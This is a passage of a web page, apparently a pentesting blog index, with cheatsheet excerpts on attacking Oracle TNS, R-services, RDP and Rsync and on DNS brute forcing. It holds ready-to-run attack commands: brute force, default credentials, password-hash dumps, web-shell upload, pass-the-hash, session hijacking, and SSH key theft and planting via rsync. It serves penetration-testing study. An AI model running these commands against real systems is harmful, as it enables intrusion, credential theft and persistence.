+Nmap Scripts nmap -p 1521 --script oracle-tns-version &lt;ip&gt; nmap -p 1521 --script oracle-sid-brute &lt;ip&gt; nmap -p 1521 --script oracle-brute &lt;ip&gt; nmap -p 1521 --script oracle-brute-stealth &lt;ip&gt; nmap -p 1521 --script oracle-enum-users \ --script-args oracle-enum-users.sid=&lt;sid&gt; &lt;ip&gt; ODAT (Oracle Database Attacking Tool) # Full automated scan odat all -s &lt;ip&gt; -p 1521 # SID brute force odat sidguesser -s &lt;ip&gt; -p 1521 # Password brute force (after getting SID) odat passwordguesser -s &lt;ip&gt; -p 1521 -d &lt;sid&gt; # File read/write (requires UTL_FILE privilege) odat utlfile -s &lt;ip&gt; -d &lt;sid&gt; -U &lt;user&gt; -P &lt;pass&gt; --getFile /etc/passwd /tmp/passwd.txt odat utlfile -s &lt;ip&gt; -d &lt;sid&gt; -U &lt;user&gt; -P &lt;pass&gt; --putFile /tmp shell.php shell.php # OS command execution (requires Java) odat java -s &lt;ip&gt; -d &lt;sid&gt; -U &lt;user&gt; -P &lt;pass&gt; --exec &#34;whoami&#34; # External table method for file read odat externaltable -s &lt;ip&gt; -d &lt;sid&gt; -U &lt;user&gt; -P &lt;pass&gt; --getFile /etc/passwd sqlplus (Direct Connection) # Install: sudo apt install oracle-instantclient-sqlplus # Connect sqlplus &lt;user&gt;/&lt;pass&gt;@&lt;ip&gt;:&lt;port&gt;/&lt;sid&gt; sqlplus &lt;user&gt;/&lt;pass&gt;@&lt;ip&gt;:&lt;port&gt;/&lt;sid&gt; as sysdba sqlplus &lt;user&gt;/&lt;pass&gt;@//&lt;ip&gt;:&lt;port&gt;/&lt;service_name&gt; Common SIDs to Try XE ORCL DB DATABASE PROD TEST DEV ORACLE OEMREP ORACLR_CONNECTION_DATA Enumeration Queries (Once Connected) -- Version and user SELECT * FROM v$version; SELECT user FROM dual; SELECT * FROM session_privs; -- Database objects SELECT * FROM all_tables; SELECT owner, table_name FROM all_tables WHERE owner != &#39;SYS&#39;; SELECT column_name, data_type FROM all_tab_columns WHERE table_name = &#39;&lt;TABLE&gt;&#39;; -- Users and privileges SELECT username FROM dba_users; SELECT * FROM user_role_privs; SELECT * FROM dba_sys_privs WHERE grantee = &#39;&lt;user&gt;&#39;; -- Password hashes (as SYSDBA) SELECT name, password FROM sys.user$; SELECT name, spare4 FROM sys.user$; -- SHA-1 hashes (11g&#43;) -- Check for DBA role SELECT * FROM session_privs WHERE privilege = &#39;CREATE SESSION&#39;; Privilege Escalation via Java -- Grant Java permissions (as DBA) EXEC dbms_java.grant_permission(&#39;SCOTT&#39;, &#39;SYS:java.io.FilePermission&#39;, &#39;&lt;&lt;ALL FILES&gt;&gt;&#39;, &#39;execute&#39;); EXEC dbms_java.grant_permission(&#39;SCOTT&#39;, &#39;SYS:java.lang.RuntimePermission&#39;, &#39;writeFileDescriptor&#39;, &#39;&#39;); EXEC dbms_java.grant_permission(&#39;SCOTT&#39;, &#39;SYS:java.lang.RuntimePermission&#39;, &#39;readFileDescriptor&#39;, &#39;&#39;); -- Execute OS command via Java SELECT dbms_java.runjava(&#39;oracle/aurora/util/Wrapper /bin/bash -c &#34;id &gt; /tmp/out&#34;&#39;) FROM dual; Brute Force hydra -l &lt;user&gt; -P wordlist.txt -s 1521 oracle://&lt;ip&gt;/&lt;sid&gt; nmap -p 1521 --script oracle-brute \ --script-args oracle-brute.sid=&lt;sid&gt; &lt;ip&gt; Default Credentials Username Password Notes sys change_on_install sysdba system manager scott tiger Classic demo user dbsnmp dbsnmp SNMP agent mdsys mdsys hr hr </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to Oracle TNS" href="https://d3vilsec.com/cheatsheets/pentesting/footprinting/oracle-tns/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">puredns
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>puredns Cheatsheet Type: Powerful DNS brute-forcing and resolution tool — filters wildcard results effectively at scale
+Installation go install github.com/d3mondev/puredns/v2@latest # Binary ends up in ~/go/bin/puredns # Also requires massdns (dependency for fast resolution) git clone https://github.com/blechschmidt/massdns.git cd massdns &amp;&amp; make sudo cp bin/massdns /usr/local/bin/ Modes Mode Description bruteforce Brute force subdomains using a wordlist resolve Resolve a list of domains/subdomains Basic Usage # Brute force puredns bruteforce wordlist.txt example.com # Resolve a list of subdomains puredns resolve subdomains.txt Common Flags Flag Description -r &lt;file&gt; Resolver list file (required for speed) --resolvers-trusted &lt;file&gt; Trusted resolvers for wildcard detection -l &lt;n&gt; Rate limit (queries per second) --bin &lt;path&gt; Path to massdns binary -w &lt;file&gt; Write valid results to file --wildcard-tests &lt;n&gt; Number of wildcard tests per domain (default: 10) --wildcard-batch &lt;n&gt; Subdomains to test per batch --skip-wildcard-filter Skip wildcard filtering --skip-validation Skip validation step -t &lt;n&gt; Massdns threads -q Quiet mode -v Verbose Common Commands # Basic brute force with resolver list puredns bruteforce wordlist.txt example.com -r resolvers.txt # Brute force with rate limiting puredns bruteforce wordlist.txt example.com \ -r resolvers.txt \ -l 1000 # Brute force with trusted resolvers for wildcard detection puredns bruteforce wordlist.txt example.com \ -r resolvers.txt \ --resolvers-trusted trusted.txt # Save results to file puredns bruteforce wordlist.txt example.com \ -r resolvers.txt \ -w results.txt # Resolve a list of subdomains puredns resolve subdomains.txt -r resolvers.txt # Resolve and save valid results puredns resolve subdomains.txt -r resolvers.txt -w resolved.txt # Skip wildcard filter (if you want all results) puredns bruteforce wordlist.txt example.com \ -r resolvers.txt \ --skip-wildcard-filter # Quiet output (subdomains only to stdout) puredns bruteforce wordlist.txt example.com -r resolvers.txt -q Resolver Lists Public resolver lists are essential for speed and accuracy:
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span>3 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to puredns" href="https://d3vilsec.com/cheatsheets/pentesting/information-gathering-web-edition/dns-and-subdomains/puredns/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">R Services
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>R-Services Enumeration Cheatsheet Default Ports:
+rexec: 512 (TCP) rlogin: 513 (TCP) rsh / rcp: 514 (TCP) rpcbind / portmapper: 111 (TCP/UDP) Note: R-services transmit data in cleartext and rely on IP-based trust. They are largely obsolete but still found in legacy Unix/Linux environments.
+Detection nmap -p 512-514 &lt;ip&gt; nmap -p 512-514 -sV &lt;ip&gt; nmap -p 111 &lt;ip&gt; rlogin # Login as current user rlogin &lt;ip&gt; # Login as specific user rlogin -l &lt;user&gt; &lt;ip&gt; rsh (Remote Shell) # Execute command remotely rsh &lt;ip&gt; &lt;command&gt; rsh -l &lt;user&gt; &lt;ip&gt; whoami rsh -l &lt;user&gt; &lt;ip&gt; cat /etc/passwd rsh -l &lt;user&gt; &lt;ip&gt; /bin/bash rexec (Remote Exec) rexec &lt;ip&gt; -l &lt;user&gt; &lt;command&gt; rexec &lt;ip&gt; -l &lt;user&gt; id rpcbind / Portmapper (Port 111) # List all registered RPC services rpcinfo -p &lt;ip&gt; # List NFS mounts (if NFS is running) showmount -e &lt;ip&gt; # Nmap nmap -p 111 --script rpcinfo &lt;ip&gt; nmap -p 111 --script nfs-ls &lt;ip&gt; nmap -p 111 --script nfs-showmount &lt;ip&gt; nmap -p 111 --script nfs-statfs &lt;ip&gt; rwho / ruptime # List logged-in users across trusted hosts rwho # Show uptime across trusted hosts ruptime Trust Files (Critical Targets) These files define which hosts/users can connect without a password:
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to R Services" href="https://d3vilsec.com/cheatsheets/pentesting/footprinting/r-services/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">RDP
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>RDP Enumeration Cheatsheet Default Port: 3389 (TCP)
+Detection &amp; Info Gathering nmap -p 3389 -sV &lt;ip&gt; nmap -p 3389 --script rdp-enum-encryption &lt;ip&gt; nmap -p 3389 --script rdp-vuln-ms12-020 &lt;ip&gt; nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info &lt;ip&gt; Check NLA (Network Level Auth) # If NLA is required, credential prompt appears BEFORE full connection nmap -p 3389 --script rdp-enum-encryption &lt;ip&gt; # Look for: &#34;Security layer: NLA&#34; or &#34;CredSSP&#34; # rdp_check.py (impacket) — tests credential validity python3 rdp_check.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; Password Attacks # Hydra hydra -l &lt;user&gt; -P wordlist.txt rdp://&lt;ip&gt; hydra -L users.txt -P wordlist.txt rdp://&lt;ip&gt; hydra -l &lt;user&gt; -P wordlist.txt rdp://&lt;ip&gt; -t 4 # Limit threads (RDP is picky) # Crowbar crowbar -b rdp -s &lt;ip&gt;/32 -u &lt;user&gt; -C wordlist.txt crowbar -b rdp -s 192.168.1.0/24 -U users.txt -C wordlist.txt # Metasploit use auxiliary/scanner/rdp/rdp_scanner set RHOSTS &lt;ip&gt; run Connecting via Linux # xfreerdp (recommended) xfreerdp /u:&lt;user&gt; /p:&lt;pass&gt; /v:&lt;ip&gt; xfreerdp /u:&lt;user&gt; /p:&lt;pass&gt; /v:&lt;ip&gt; /d:&lt;domain&gt; xfreerdp /u:&lt;user&gt; /p:&lt;pass&gt; /v:&lt;ip&gt; /drive:share,/tmp # Mount local dir xfreerdp /u:&lt;user&gt; /p:&lt;pass&gt; /v:&lt;ip&gt; /cert-ignore # Ignore cert errors xfreerdp /u:&lt;user&gt; /h:&lt;nthash&gt; /v:&lt;ip&gt; # Pass-the-Hash # rdesktop rdesktop &lt;ip&gt; rdesktop -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; &lt;ip&gt; # Remmina (GUI) remmina -c rdp://&lt;user&gt;@&lt;ip&gt; Session Hijacking (Post-Exploitation) # List sessions (on Windows target) query session query user # Hijack disconnected session (as SYSTEM) tscon &lt;session_id&gt; /dest:&lt;current_session&gt; Key Vulnerabilities CVE Name Affected Systems Description CVE-2019-0708 BlueKeep Win7, WinXP, Server 2008 Pre-auth RCE via RDP CVE-2019-1181 DejaBlue Win8, Win10, Server 2012&#43; Pre-auth RCE via RDP CVE-2019-1182 DejaBlue Win8, Win10, Server 2012&#43; Pre-auth RCE via RDP CVE-2012-0002 MS12-020 Multiple DoS / potential code execution BlueKeep Check (Metasploit) use auxiliary/scanner/rdp/cve_2019_0708_bluekeep set RHOSTS &lt;ip&gt; run Useful Options # Custom RDP port xfreerdp /u:&lt;user&gt; /p:&lt;pass&gt; /v:&lt;ip&gt;:&lt;port&gt; # Enable clipboard sharing xfreerdp /u:&lt;user&gt; /p:&lt;pass&gt; /v:&lt;ip&gt; &#43;clipboard # Full screen xfreerdp /u:&lt;user&gt; /p:&lt;pass&gt; /v:&lt;ip&gt; /f # Dynamic resolution xfreerdp /u:&lt;user&gt; /p:&lt;pass&gt; /v:&lt;ip&gt; /dynamic-resolution </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to RDP" href="https://d3vilsec.com/cheatsheets/pentesting/footprinting/rdp/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">ReconSpider
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>ReconSpider Cheatsheet Type: Custom Scrapy-based web crawler that maps a target site and harvests links, emails, subdomains, external hosts, images, files, and metadata into a single JSON report
+Installation # Download the spider (HTB Academy distribution) wget -O ReconSpider.zip \ https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.06.zip unzip ReconSpider.zip # Requires Scrapy (and Python 3) pip3 install scrapy ReconSpider is a single Python script (ReconSpider.py) built on top of [[scrapy]]. There is no system package — it runs directly with python3.
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span>3 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to ReconSpider" href="https://d3vilsec.com/cheatsheets/pentesting/information-gathering-web-edition/web-crawling/reconspider/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Rsync
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Rsync Enumeration Cheatsheet Default Port: 873 (TCP)
+Detection nmap -p 873 &lt;ip&gt; nmap -p 873 -sV &lt;ip&gt; nmap -p 873 --script rsync-list-modules &lt;ip&gt; nc -nv &lt;ip&gt; 873 List Available Modules (Shares) # List modules (no auth) rsync -av --list-only rsync://&lt;ip&gt;/ rsync rsync://&lt;ip&gt;/ # nc banner grab nc -nv &lt;ip&gt; 873 # Then type: #list Enumerate Files in a Module rsync -av --list-only rsync://&lt;ip&gt;/&lt;module&gt;/ rsync -av --list-only rsync://&lt;ip&gt;/&lt;module&gt;/subdir/ # Recursive listing of entire module rsync -r --list-only rsync://&lt;ip&gt;/&lt;module&gt;/ Download Files # Download single file rsync rsync://&lt;ip&gt;/&lt;module&gt;/file.txt ./ # Download entire module rsync -av rsync://&lt;ip&gt;/&lt;module&gt;/ ./local_copy/ # With credentials rsync -av rsync://&lt;user&gt;@&lt;ip&gt;/&lt;module&gt;/ ./ rsync --password-file=pass.txt rsync://&lt;user&gt;@&lt;ip&gt;/&lt;module&gt;/ ./ # Dry run (see what would be downloaded) rsync -av --dry-run rsync://&lt;ip&gt;/&lt;module&gt;/ ./ Upload Files # Upload single file rsync -av ./shell.php rsync://&lt;user&gt;@&lt;ip&gt;/&lt;module&gt;/ # Upload directory rsync -av ./payload/ rsync://&lt;user&gt;@&lt;ip&gt;/&lt;module&gt;/uploads/ # With password file rsync --password-file=pass.txt -av ./file rsync://&lt;user&gt;@&lt;ip&gt;/&lt;module&gt;/ High-Value Paths to Check rsync -av --list-only rsync://&lt;ip&gt;/home/ rsync -av --list-only rsync://&lt;ip&gt;/root/ rsync -av --list-only rsync://&lt;ip&gt;/etc/ rsync -av --list-only rsync://&lt;ip&gt;/backup/ rsync -av --list-only rsync://&lt;ip&gt;/var/www/ rsync -av --list-only rsync://&lt;ip&gt;/.ssh/ SSH Key Theft &amp; Planting # Download .ssh directory rsync -av rsync://&lt;ip&gt;/home/&lt;user&gt;/.ssh/ ./stolen_keys/ # Plant authorized_keys (if write access) rsync -av ~/.ssh/id_rsa.pub rsync://&lt;user&gt;@&lt;ip&gt;/home/&lt;user&gt;/.ssh/authorized_keys Nmap Scripts nmap -p 873 --script rsync-list-modules &lt;ip&gt; </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>1 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to Rsync" href="https://d3vilsec.com/cheatsheets/pentesting/footprinting/rsync/"></a>
+</article>
 <footer class="page-footer">
   <nav class="pagination">
     <a class="next" href="https://d3vilsec.com/page/2/">Next&nbsp;&nbsp;»
